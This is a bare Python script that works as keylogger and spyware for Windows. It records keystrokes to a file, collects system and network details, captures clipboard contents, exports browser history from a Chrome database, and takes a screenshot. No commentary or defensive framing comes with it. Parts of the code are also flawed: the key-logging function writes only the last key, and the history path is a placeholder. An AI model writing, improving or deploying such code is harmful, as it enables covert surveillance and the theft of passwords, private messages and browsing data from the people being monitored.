from pynput.keyboard import Key, Listener 
import sqlite3 
import datetime 
import socket 
import platform 
from requests import get 
import win32clipboard 
from PIL import ImageGrab 
import pandas as pd 


k = []
def on_press(key):
    k.append(key)
    write_file(k)
    print(key)

def write_file(var):
    with open("logs.txt","a") as f:
        for i in var:
            new_var = str(i).replace("'","")
        f.write(new_var)
        f.write(" ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join() 


date = datetime.date.today() 

ip_address = socket.gethostbyname(socket.gethostname()) 

processor = platform.processor() 

system = platform.system() 
release = platform.release()

host_name = socket.gethostname() 


data = {
    'Metric': ['Date','IP Address', 'Processor', 'System', 'Release', 'Host Name'],
    'Value': [date,ip_address, processor, system, release, host_name]
}
df = pd.DataFrame(data)

df.to_excel('keystrokes.xlsx', index=False)


def copy_clipboard():
    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:
        
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\n")
            f.write("date and time:"+ str(current_date)+"\n")
            f.write("clipboard data: \n "+ pasted_data) 
        
copy_clipboard()




conn = sqlite3.connect('C:\\Users\\username\\Desktop\\history1') 
cursor = conn.cursor()


cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
search_history = cursor.fetchall()


df = pd.DataFrame(search_history, columns=['url', 'title', 'Timestamp'])

excel_file = "search_history.xlsx"
df.to_excel(excel_file, index=False)

conn.close()

def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

screenshot()